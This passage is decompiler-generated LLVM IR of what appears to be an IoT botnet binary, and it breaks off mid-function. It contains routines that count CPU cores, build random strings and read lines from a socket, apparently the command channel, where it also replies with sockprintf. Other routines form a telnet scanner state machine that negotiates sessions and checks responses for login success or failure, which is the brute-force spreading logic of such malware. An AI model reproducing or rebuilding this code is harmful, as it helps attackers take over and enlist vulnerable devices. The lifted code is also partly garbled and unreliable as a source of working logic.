dec_label_pc_10001c34:                            ; preds = %dec_label_pc_10001c34.preheader, %dec_label_pc_10001c0c
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c3c = call i32 @__GI_strlen()
  %v1_10001c50 = add i32 %v0_10001c3c, %v2_10001c4c
  %v1_10001c54 = inttoptr i32 %v1_10001c50 to i8*
  %v2_10001c54 = load i8, i8* %v1_10001c54, align 1
  %v3_10001c5c = icmp eq i8 %v2_10001c54, 13
  br i1 %v3_10001c5c, label %dec_label_pc_10001c0c, label %dec_label_pc_10001c64

dec_label_pc_10001c64:                            ; preds = %dec_label_pc_10001c34
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c6c = call i32 @__GI_strlen()
  %v1_10001c80 = add i32 %v0_10001c6c, %v2_10001c4c
  %v1_10001c84 = inttoptr i32 %v1_10001c80 to i8*
  %v2_10001c84 = load i8, i8* %v1_10001c84, align 1
  %v3_10001c8c = icmp eq i8 %v2_10001c84, 10
  br i1 %v3_10001c8c, label %dec_label_pc_10001c0c, label %dec_label_pc_10001c94

dec_label_pc_10001c94:                            ; preds = %dec_label_pc_10001c64
  store i32 %v4_10001bcc, i32* @r3, align 4
  store i32 268442788, i32* @lr, align 4
  %v2_10001ca0 = call i32 @__GI_strchr(i32 %v4_10001bcc, i32 46)
  %v3_10001ca8 = icmp eq i32 %v2_10001ca0, 0
  br i1 %v3_10001ca8, label %dec_label_pc_10001ccc, label %dec_label_pc_10001cb0

dec_label_pc_10001cb0:                            ; preds = %dec_label_pc_10001c94
  store i32 %v4_10001bcc, i32* @r3, align 4
  store i32 268442816, i32* @lr, align 4
  %v2_10001cbc = call i32 @__GI_strchr(i32 %v4_10001bcc, i32 46)
  %v3_10001cc8 = inttoptr i32 %v2_10001cbc to i8*
  store i8 0, i8* %v3_10001cc8, align 1
  br label %dec_label_pc_10001ccc

dec_label_pc_10001ccc:                            ; preds = %dec_label_pc_10001c94, %dec_label_pc_10001cb0
  %v3_10001cdc = call i32 @strcpy(i32 %arg1, i8* %storemerge2)
  store i32 ptrtoint (i32* @global_var_10001ce8.26 to i32), i32* @lr, align 4
  %v1_10001ce4 = call i32 @__libc_close(i32 %v3_10001b6c)
  br label %dec_label_pc_10001d3c

dec_label_pc_10001cf4:                            ; preds = %dec_label_pc_10001b7c
  store i32 268442892, i32* @lr, align 4
  %v3_10001d08 = call i32 @__GI_memset(i32 %v2_10001d0c, i32 0, i32 4096)
  br label %dec_label_pc_10001d0c

dec_label_pc_10001d0c:                            ; preds = %entry, %dec_label_pc_10001cf4
  %v3_10001d1c = call i32 @fdgets(i32 %v2_10001d0c, i32 4096, i32 %v3_10001b6c)
  %v3_10001d24 = icmp eq i32 %v3_10001d1c, 0
  br i1 %v3_10001d24, label %dec_label_pc_10001d2c, label %dec_label_pc_10001b7c

dec_label_pc_10001d2c:                            ; preds = %dec_label_pc_10001d0c
  store i32 ptrtoint (i32* @global_var_10001d34.27 to i32), i32* @lr, align 4
  %v1_10001d30 = call i32 @__libc_close(i32 %v3_10001b6c)
  br label %dec_label_pc_10001d3c

dec_label_pc_10001d3c:                            ; preds = %dec_label_pc_10001ccc, %dec_label_pc_10001d2c
  %storemerge = phi i32 [ 1, %dec_label_pc_10001d2c ], [ 0, %dec_label_pc_10001ccc ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_10001bcc, { 1, 0, 3, 2, 4, 7, 5, 6, 8 }
  uselistorder i8* %storemerge2, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_10001d0c, { 3, 0, 1, 2 }
  uselistorder i32 %v3_10001b6c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001d3c, { 1, 0 }
  uselistorder label %dec_label_pc_10001d0c, { 1, 0 }
  uselistorder label %dec_label_pc_10001ccc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c34, { 1, 0 }
  uselistorder label %dec_label_pc_10001bcc, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4112 = alloca i32, align 4
  store i32 268443020, i32* @lr, align 4
  %v3_10001d88 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_100150b8.24 to i32), i32 0)
  %v2_10001dec = ptrtoint i32* %stack_var_-4112 to i32
  %v1_10001da0 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_10001dec

dec_label_pc_10001d98:                            ; preds = %dec_label_pc_10001dec
  store i32 268443044, i32* @lr, align 4
  %v2_10001da0 = call i32 @uppercase(i8* %v1_10001da0)
  store i32 268443064, i32* @lr, align 4
  %v5_10001db4 = call i32 @strstr(i32 %v2_10001dec, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_100150c8.25, i32 0, i32 0), i32 268500992)
  %v4_10001dc0 = icmp eq i32 %v5_10001db4, %v2_10001dec
  br i1 %v4_10001dc0, label %dec_label_pc_10001dc8, label %dec_label_pc_10001dd4

dec_label_pc_10001dc8:                            ; preds = %dec_label_pc_10001d98
  %v1_10001dcc = add i32 %stack_var_-4116.1, 1
  br label %dec_label_pc_10001dd4

dec_label_pc_10001dd4:                            ; preds = %dec_label_pc_10001d98, %dec_label_pc_10001dc8
  %stack_var_-4116.0 = phi i32 [ %v1_10001dcc, %dec_label_pc_10001dc8 ], [ %stack_var_-4116.1, %dec_label_pc_10001d98 ]
  store i32 268443116, i32* @lr, align 4
  %v3_10001de8 = call i32 @__GI_memset(i32 %v2_10001dec, i32 0, i32 4096)
  br label %dec_label_pc_10001dec

dec_label_pc_10001dec:                            ; preds = %entry, %dec_label_pc_10001dd4
  %stack_var_-4116.1 = phi i32 [ 0, %entry ], [ %stack_var_-4116.0, %dec_label_pc_10001dd4 ]
  %v3_10001dfc = call i32 @fdgets(i32 %v2_10001dec, i32 4096, i32 %v3_10001d88)
  %v3_10001e04 = icmp eq i32 %v3_10001dfc, 0
  br i1 %v3_10001e04, label %dec_label_pc_10001e0c, label %dec_label_pc_10001d98

dec_label_pc_10001e0c:                            ; preds = %dec_label_pc_10001dec
  store i32 268443156, i32* @lr, align 4
  %v1_10001e10 = call i32 @__libc_close(i32 %v3_10001d88)
  ret i32 %stack_var_-4116.1

; uselistorder directives
  uselistorder i32 %stack_var_-4116.1, { 0, 2, 1 }
  uselistorder i32 %v2_10001dec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10001dec, { 1, 0 }
  uselistorder label %dec_label_pc_10001dd4, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10001e4c = load i32, i32* %r3.global-to-local, align 4
  %v2_10001ecc4 = icmp sgt i32 %arg2, 0
  br i1 %v2_10001ecc4, label %dec_label_pc_10001e68, label %dec_label_pc_10001ed4

dec_label_pc_10001e68:                            ; preds = %entry, %dec_label_pc_10001e68
  %storemerge37 = phi i32 [ %v1_10001ebc, %dec_label_pc_10001e68 ], [ 0, %entry ]
  %v2_10001e74 = add i32 %storemerge37, %v0_10001e4c
  %v0_10001e78 = call i32 @rand_cmwc()
  store i32 %v0_10001e78, i32* %r3.global-to-local, align 4
  %v1_10001e8c = urem i32 %v0_10001e78, 26
  %fold = add nuw nsw i32 %v1_10001e8c, 65
  %v1_10001eb4 = trunc i32 %fold to i8
  %v3_10001eb4 = inttoptr i32 %v2_10001e74 to i8*
  store i8 %v1_10001eb4, i8* %v3_10001eb4, align 1
  %v1_10001ebc = add nuw nsw i32 %storemerge37, 1
  %v2_10001ecc = icmp slt i32 %v1_10001ebc, %arg2
  br i1 %v2_10001ecc, label %dec_label_pc_10001e68, label %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge

dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge: ; preds = %dec_label_pc_10001e68
  %v0_10001eec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001ed4

dec_label_pc_10001ed4:                            ; preds = %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge, %entry
  %v0_10001eec = phi i32 [ %v0_10001eec.pre, %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge ], [ %v0_10001e4c, %entry ]
  ret i32 %v0_10001eec

; uselistorder directives
  uselistorder i32 %v1_10001ebc, { 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v0_10001e4c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10001e68, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i8, align 1
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10001f28.28 to i32), i32* @lr, align 4
  %v4_10001f24 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-40, align 4
  %v2_10001f38 = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_10001f4c

dec_label_pc_10001f4c:                            ; preds = %entry, %dec_label_pc_10001f4c
  %storemerge618 = phi i32 [ 0, %entry ], [ %v1_10001f68, %dec_label_pc_10001f4c ]
  %v1_10001f54 = mul nuw nsw i32 %storemerge618, 4
  %v2_10001f58 = add i32 %v1_10001f54, %v2_10001f38
  %v2_10001f60 = inttoptr i32 %v2_10001f58 to i32*
  store i32 0, i32* %v2_10001f60, align 4
  %v1_10001f68 = add nuw nsw i32 %storemerge618, 1
  %tmp42 = icmp ult i32 %v1_10001f68, 32
  br i1 %tmp42, label %dec_label_pc_10001f4c, label %dec_label_pc_10001f7c

dec_label_pc_10001f7c:                            ; preds = %dec_label_pc_10001f4c
  %v1_10001f80 = udiv i32 %arg1, 32
  %v1_10001f88 = mul nuw nsw i32 %v1_10001f80, 4
  %v2_10001f8c = ptrtoint i32* %stack_var_-200 to i32
  %v2_10001f90 = add nuw nsw i32 %v1_10001f88, 32
  %v1_10001f94 = add i32 %v2_10001f90, %v2_10001f8c
  %v1_10001f98 = inttoptr i32 %v1_10001f94 to i32*
  %v2_10001f98 = load i32, i32* %v1_10001f98, align 4
  %v1_10001fa0 = urem i32 %arg1, 32
  %v3_10001fa8 = shl i32 1, %v1_10001fa0
  %v2_10001fac = or i32 %v2_10001f98, %v3_10001fa8
  store i32 %v2_10001fac, i32* %v1_10001f98, align 4
  %v1_10001fc8 = add i32 %arg1, 1
  %v2_10001fd4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268443632, i32* @lr, align 4
  %v5_10001fec = call i32 @__libc_select(i32 %v1_10001fc8, i32 %v2_10001f38, i32 0, i32 %v2_10001f38, i32 %v2_10001fd4)
  %v2_10001ffc = icmp sgt i32 %v5_10001fec, 0
  br i1 %v2_10001ffc, label %dec_label_pc_100021a8.preheader, label %dec_label_pc_1000210c.preheader

dec_label_pc_1000210c.preheader:                  ; preds = %dec_label_pc_10001f7c
  %tmp43 = icmp slt i32 %tmp25, 10
  br i1 %tmp43, label %dec_label_pc_10002008, label %dec_label_pc_100021a8.preheader

dec_label_pc_10002008:                            ; preds = %dec_label_pc_1000210c.preheader, %dec_label_pc_10002100
  %stack_var_-176.017 = phi i32 [ %v1_10002104, %dec_label_pc_10002100 ], [ %tmp25, %dec_label_pc_1000210c.preheader ]
  %v3_1000200c = load i32, i32* @global_var_100285b0.29, align 4
  store i32 ptrtoint (i32* @global_var_10002024.31 to i32), i32* @lr, align 4
  %v4_10002020 = call i32 @sockprintf(i32 %v3_1000200c, i32 ptrtoint ([5 x i8]* @global_var_100150d4.30 to i32), i32 268500992)
  store i32 30, i32* %stack_var_-40, align 4
  store i32 %v2_10001f38, i32* %stack_var_-200, align 4
  store i32 0, i32* %stack_var_-168, align 4
  br label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge

dec_label_pc_10002048.dec_label_pc_10002048_crit_edge: ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge, %dec_label_pc_10002008
  %v3_1000204c.pre = phi i32 [ %v2_10001f38, %dec_label_pc_10002008 ], [ %v3_1000204c.pre.pre, %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge ]
  %v1_1000206449 = phi i32 [ 1, %dec_label_pc_10002008 ], [ %v1_10002064, %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge ]
  %v1_10002050 = mul nuw nsw i32 %v1_1000206449, 4
  %v2_10002054 = add i32 %v1_10002050, %v3_1000204c.pre
  %v2_1000205c = inttoptr i32 %v2_10002054 to i32*
  store i32 0, i32* %v2_1000205c, align 4
  %v1_10002064 = add nuw nsw i32 %v1_1000206449, 1
  %tmp44 = icmp ult i32 %v1_10002064, 32
  br i1 %tmp44, label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge, label %dec_label_pc_10002078

dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge: ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge
  %v3_1000204c.pre.pre = load i32, i32* %stack_var_-200, align 4
  br label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge

dec_label_pc_10002078:                            ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge
  %v2_10002094 = load i32, i32* %v1_10001f98, align 4
  %v2_100020a8 = or i32 %v2_10002094, %v3_10001fa8
  store i32 %v2_100020a8, i32* %v1_10001f98, align 4
  store i32 268443884, i32* @lr, align 4
  %v5_100020e8 = call i32 @__libc_select(i32 %v1_10001fc8, i32 %v2_10001f38, i32 0, i32 %v2_10001f38, i32 %v2_10001fd4)
  %v2_100020f8 = icmp sgt i32 %v5_100020e8, 0
  br i1 %v2_100020f8, label %dec_label_pc_100021a8.preheader, label %dec_label_pc_10002100

dec_label_pc_10002100:                            ; preds = %dec_label_pc_10002078
  %v1_10002104 = add nsw i32 %stack_var_-176.017, 1
  %tmp45 = icmp slt i32 %v1_10002104, 10
  br i1 %tmp45, label %dec_label_pc_10002008, label %dec_label_pc_100021a8.preheader

dec_label_pc_100021a8.preheader:                  ; preds = %dec_label_pc_10002100, %dec_label_pc_10002078, %dec_label_pc_1000210c.preheader, %dec_label_pc_10001f7c
  %v2_10002134 = ptrtoint i8* %stack_var_-32 to i32
  br label %dec_label_pc_100021a8

dec_label_pc_1000212c:                            ; preds = %dec_label_pc_100021a8
  %v3_10002130 = load i32, i32* @global_var_100285b0.29, align 4
  store i32 268443980, i32* @lr, align 4
  %v4_10002148 = call i32 @__libc_recv(i32 %v3_10002130, i32 %v2_10002134, i32 1, i32 0)
  %v3_10002150 = icmp eq i32 %v4_10002148, 1
  br i1 %v3_10002150, label %dec_label_pc_10002170, label %dec_label_pc_10002158

dec_label_pc_10002158:                            ; preds = %dec_label_pc_1000212c
  store i8 0, i8* %stack_var_-180.0, align 1
  br label %dec_label_pc_100021e4

dec_label_pc_10002170:                            ; preds = %dec_label_pc_1000212c
  %v3_10002170 = load i8, i8* %stack_var_-32, align 1
  %v4_10002178 = ptrtoint i8* %stack_var_-180.0 to i32
  store i8 %v3_10002170, i8* %stack_var_-180.0, align 1
  %v1_10002184 = add i32 %v4_10002178, 1
  %v5_10002188 = inttoptr i32 %v1_10002184 to i8*
  %v3_1000218c = load i8, i8* %stack_var_-32, align 1
  %v3_10002194 = icmp eq i8 %v3_1000218c, 10
  br i1 %v3_10002194, label %dec_label_pc_100021d0, label %dec_label_pc_1000219c

dec_label_pc_1000219c:                            ; preds = %dec_label_pc_10002170
  %v1_100021a0 = add i32 %stack_var_-184.0, 1
  br label %dec_label_pc_100021a8

dec_label_pc_100021a8:                            ; preds = %dec_label_pc_100021a8.preheader, %dec_label_pc_1000219c
  %stack_var_-180.0 = phi i8* [ %v5_10002188, %dec_label_pc_1000219c ], [ %arg2, %dec_label_pc_100021a8.preheader ]
  %stack_var_-184.0 = phi i32 [ %v1_100021a0, %dec_label_pc_1000219c ], [ 0, %dec_label_pc_100021a8.preheader ]
  %v0_100021b0 = call i32 @__asm_mfcr()
  %v1_100021b4 = call i32 @__asm_rlwinm(i32 %v0_100021b0, i32 30, i32 31, i32 31)
  %v1_100021b8 = urem i32 %v1_100021b4, 256
  %v3_100021c8 = icmp eq i32 %v1_100021b8, 0
  br i1 %v3_100021c8, label %dec_label_pc_100021d0, label %dec_label_pc_1000212c

dec_label_pc_100021d0:                            ; preds = %dec_label_pc_100021a8, %dec_label_pc_10002170
  %stack_var_-180.1 = phi i8* [ %stack_var_-180.0, %dec_label_pc_100021a8 ], [ %v5_10002188, %dec_label_pc_10002170 ]
  store i8 0, i8* %stack_var_-180.1, align 1
  br label %dec_label_pc_100021e4

dec_label_pc_100021e4:                            ; preds = %dec_label_pc_10002158, %dec_label_pc_100021d0
  %storemerge = phi i32 [ -1, %dec_label_pc_10002158 ], [ %stack_var_-184.0, %dec_label_pc_100021d0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-180.0, { 3, 0, 1, 2 }
  uselistorder i8* %v5_10002188, { 1, 0 }
  uselistorder i32 %v1_10002104, { 1, 0 }
  uselistorder i32 %v1_10002064, { 1, 0 }
  uselistorder i32 %v2_10001fd4, { 1, 0 }
  uselistorder i32* %v1_10001f98, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge618, { 1, 0 }
  uselistorder i32 %v2_10001f38, { 5, 4, 0, 6, 3, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i8* %stack_var_-32, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100021e4, { 1, 0 }
  uselistorder label %dec_label_pc_100021a8, { 1, 0 }
  uselistorder label %dec_label_pc_10002008, { 1, 0 }
  uselistorder label %dec_label_pc_10001f4c, { 1, 0 }
}

define i32 @get_telstate_host(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v1_10002220 = add i32 %arg1, 4
  %v2_10002220 = inttoptr i32 %v1_10002220 to i32*
  %v3_10002220 = load i32, i32* %v2_10002220, align 4
  store i32 %v3_10002220, i32* %stack_var_-20, align 4
  store i32 268444220, i32* @lr, align 4
  %v3_10002238 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-20, i32 %arg1)
  ret i32 %v3_10002238
}

define i32 @read_until_response(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 268444316, i32* @lr, align 4
  %v4_10002298 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg4)
  %v5_100022b0 = call i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %tmp, i32 %arg4)
  %v3_100022c0 = load i8, i8* %arg3, align 1
  %v3_100022c8 = icmp eq i8 %v3_100022c0, -1
  br i1 %v3_100022c8, label %dec_label_pc_100022d0, label %dec_label_pc_100022e4

dec_label_pc_100022d0:                            ; preds = %entry
  store i32 268444388, i32* @lr, align 4
  %v6_100022e0 = call i32 @negotiate(i32 %arg1, i32 %tmp, i32 3, i32 %tmp)
  br label %dec_label_pc_100022e4

dec_label_pc_100022e4:                            ; preds = %entry, %dec_label_pc_100022d0
  %v3_100022f0 = call i32 @contains_string(i32 %tmp, i32 %arg5)
  %v3_100022f8 = icmp ne i32 %v3_100022f0, 0
  %. = zext i1 %v3_100022f8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_100022e4, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v2_10002368 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10002368, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-176, align 4
  br label %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge

dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge: ; preds = %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge, %entry
  %v3_10002380.pre = phi i32 [ %v2_10002368, %entry ], [ %v3_10002380.pre.pre, %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge ]
  %v1_1000239821 = phi i32 [ 1, %entry ], [ %v1_10002398, %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge ]
  %v1_10002384 = mul nuw nsw i32 %v1_1000239821, 4
  %v2_10002388 = add i32 %v1_10002384, %v3_10002380.pre
  %v2_10002390 = inttoptr i32 %v2_10002388 to i32*
  store i32 0, i32* %v2_10002390, align 4
  %v1_10002398 = add nuw nsw i32 %v1_1000239821, 1
  %tmp19 = icmp ult i32 %v1_10002398, 32
  br i1 %tmp19, label %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge, label %dec_label_pc_100023ac

dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge.dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge_crit_edge: ; preds = %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge
  %v3_10002380.pre.pre = load i32, i32* %stack_var_-184, align 4
  br label %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge

dec_label_pc_100023ac:                            ; preds = %dec_label_pc_1000237c.dec_label_pc_1000237c_crit_edge
  %v1_100023b0 = udiv i32 %arg1, 32
  %v1_100023b8 = mul nuw nsw i32 %v1_100023b0, 4
  %v2_100023bc = ptrtoint i32* %stack_var_-184 to i32
  %v2_100023c0 = add nuw nsw i32 %v1_100023b8, 8
  %v1_100023c4 = add i32 %v2_100023c0, %v2_100023bc
  %v1_100023c8 = inttoptr i32 %v1_100023c4 to i32*
  %v2_100023c8 = load i32, i32* %v1_100023c8, align 4
  %v1_100023d0 = urem i32 %arg1, 32
  %v3_100023d8 = shl i32 1, %v1_100023d0
  %v2_100023dc = or i32 %v2_100023c8, %v3_100023d8
  store i32 %v2_100023dc, i32* %v1_100023c8, align 4
  %v1_100023f8 = add i32 %arg1, 1
  %v2_10002400 = ptrtoint i32* %stack_var_-48 to i32
  store i32 268444700, i32* @lr, align 4
  %v5_10002418 = call i32 @__libc_select(i32 %v1_100023f8, i32 %v2_10002368, i32 0, i32 0, i32 %v2_10002400)
  %v2_10002420 = icmp sgt i32 %v5_10002418, 0
  br i1 %v2_10002420, label %dec_label_pc_10002434, label %dec_label_pc_10002454

dec_label_pc_10002434:                            ; preds = %dec_label_pc_100023ac
  store i32 268444748, i32* @lr, align 4
  %v4_10002448 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_10002454

dec_label_pc_10002454:                            ; preds = %dec_label_pc_100023ac, %dec_label_pc_10002434
  %storemerge = phi i32 [ %v4_10002448, %dec_label_pc_10002434 ], [ 0, %dec_label_pc_100023ac ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10002398, { 1, 0 }
  uselistorder i32 %v2_10002368, { 1, 0, 2 }
  uselistorder i32* %stack_var_-184, { 2, 0, 1 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10002454, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10002494 = icmp eq i32 %arg2, 0
  br i1 %v3_10002494, label %dec_label_pc_1000249c, label %dec_label_pc_100024ac

dec_label_pc_1000249c:                            ; preds = %entry
  %v2_100024a0 = load i32, i32* %arg1, align 4
  store i32 268444844, i32* @lr, align 4
  %v1_100024a8 = call i32 @__libc_close(i32 %v2_100024a0)
  br label %dec_label_pc_100024ac

dec_label_pc_100024ac:                            ; preds = %entry, %dec_label_pc_1000249c
  %v2_100024b4 = add i32 %tmp, 16
  %v3_100024b4 = inttoptr i32 %v2_100024b4 to i32*
  store i32 0, i32* %v3_100024b4, align 4
  %v1_100024c4 = trunc i32 %arg2 to i8
  %v3_100024c4 = add i32 %tmp, 8
  %v4_100024c4 = inttoptr i32 %v3_100024c4 to i8*
  store i8 %v1_100024c4, i8* %v4_100024c4, align 1
  %v1_100024cc = add i32 %tmp, 24
  %v2_100024cc = inttoptr i32 %v1_100024cc to i32*
  %v3_100024cc = load i32, i32* %v2_100024cc, align 4
  store i32 268444900, i32* @lr, align 4
  %v3_100024e0 = call i32 @__GI_memset(i32 %v3_100024cc, i32 0, i32 512)
  ret i32 %v3_100024e0

; uselistorder directives
  uselistorder label %dec_label_pc_100024ac, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1000251c = inttoptr i32 %arg1 to i32*
  %v3_1000251c = call i32 @advance_state(i32* %v2_1000251c, i32 0)
  %v3_10002528 = add i32 %arg1, 9
  %v4_10002528 = inttoptr i32 %v3_10002528 to i8*
  store i8 1, i8* %v4_10002528, align 1
  ret i32 %v3_1000251c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000256c = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_100281fc.35 to i32))
  ret i32 %v3_1000256c
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100025b8 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_100281dc.43 to i32))
  ret i32 %v3_100025b8

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268445180, i32* @lr, align 4
  %v1_100025f8 = call i32 @contains_success(i32 %arg1)
  %v3_10002600 = icmp eq i32 %v1_100025f8, 0
  br i1 %v3_10002600, label %dec_label_pc_10002608, label %dec_label_pc_10002630

dec_label_pc_10002608:                            ; preds = %entry
  store i32 268445200, i32* @lr, align 4
  %v1_1000260c = call i32 @contains_fail(i32 %arg1)
  %v3_10002614 = icmp ne i32 %v1_1000260c, 0
  %. = zext i1 %v3_10002614 to i32
  br label %dec_label_pc_10002630

dec_label_pc_10002630:                            ; preds = %dec_label_pc_10002608, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_10002608 ]
  ret i32 %storemerge
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_10002684

dec_label_pc_10002684:                            ; preds = %dec_label_pc_10002684, %entry
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_10002688, %dec_label_pc_10002684 ]
  %v1_10002688 = add i32 %stack_var_-36.0, 1
  %v1_10002694 = mul i32 %v1_10002688, 4
  %v2_100026a0 = add i32 %v1_10002694, %arg2
  %v1_100026a4 = inttoptr i32 %v2_100026a0 to i32*
  %v2_100026a4 = load i32, i32* %v1_100026a4, align 4
  %v3_100026a8 = icmp eq i32 %v2_100026a4, 0
  br i1 %v3_100026a8, label %dec_label_pc_10002708.preheader, label %dec_label_pc_10002684

dec_label_pc_10002708.preheader:                  ; preds = %dec_label_pc_10002684
  %v2_100027104 = icmp sgt i32 %v1_10002688, 0
  br i1 %v2_100027104, label %dec_label_pc_100026bc.lr.ph, label %dec_label_pc_10002720

dec_label_pc_100026bc.lr.ph:                      ; preds = %dec_label_pc_10002708.preheader
  %v3_100026e0 = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_100026bc

dec_label_pc_100026bc:                            ; preds = %dec_label_pc_100026bc.lr.ph, %dec_label_pc_100026fc
  %storemerge27 = phi i32 [ 0, %dec_label_pc_100026bc.lr.ph ], [ %v1_10002700, %dec_label_pc_100026fc ]
  %v1_100026c0 = mul i32 %storemerge27, 4
  %v2_100026cc = add i32 %v1_100026c0, %arg2
  %v1_100026d0 = inttoptr i32 %v2_100026cc to i32*
  %v2_100026d0 = load i32, i32* %v1_100026d0, align 4
  store i32 268445412, i32* @lr, align 4
  %v4_100026e0 = call i32 @strcasestr(i8* %v3_100026e0, i32 %v2_100026d0, i32 %v2_100026cc)
  %v3_100026e8 = icmp eq i32 %v4_100026e0, 0
  br i1 %v3_100026e8, label %dec_label_pc_100026fc, label %dec_label_pc_10002720.loopexit

dec_label_pc_100026fc:                            ; preds = %dec_label_pc_100026bc
  %v1_10002700 = add nuw nsw i32 %storemerge27, 1
  %v2_10002710 = icmp slt i32 %v1_10002700, %v1_10002688
  br i1 %v2_10002710, label %dec_label_pc_100026bc, label %dec_label_pc_10002720.loopexit

